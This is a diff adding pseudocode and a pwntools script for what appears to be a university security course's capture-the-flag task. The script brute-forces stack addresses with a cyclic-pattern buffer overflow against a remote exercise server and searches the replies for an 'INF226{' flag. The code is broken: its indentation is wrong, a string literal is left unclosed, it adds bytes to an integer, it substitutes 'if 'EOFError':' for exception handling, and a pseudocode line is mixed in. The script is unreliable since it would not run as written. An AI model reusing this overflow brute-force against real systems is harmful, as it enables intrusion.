@@ -1,0 +1,59 @@
+Import the 'pwn' library for working with binary programs
+
+Set the logging level to 'debug' for detailed logging
+
+Iterate through a range of memory addresses:
+    Connect to a remote server at 'inf226.puffling.no' on port 7003
+
+    Try the following:
+        Receive data from the server until a specific prompt is found
+
+        Create a buffer with a cyclic pattern and the current memory address
+
+        Send the buffer to the server 
+
+        Receive and parse a canary value from the server's response (Bruk gjerne io.readall() med time out)
+
+        If the response contains 'INF226{': 
+            Print the response
+            Close the connection
+            Break out of the loop
+
+        Close the connection
+
+    If an EOFError occurs, print 'EOFError'
+
+from pwn import *
+
+Set the logging level to 'debug' for detailed logging
+
+start = 0x7ffffffff000
+stop = 0x7fffffffb000
+
+for i in xrange(start, stop + 1):
+    io = remote('inf226.puffling.no', 7003)
+        io.recvuntil(b'1. )
+        buffer = cyclic(32) + i 
+        io.sendline(buffer)
+        r = io.readall()
+
+        if "INF226{" in r:
+            print(r)
+            io.close()
+            break 
+        
+        io.close() 
+
+    if 'EOFError':
+        print(EOFError)
+
+
+
+
+
+
+
+
+
+
+
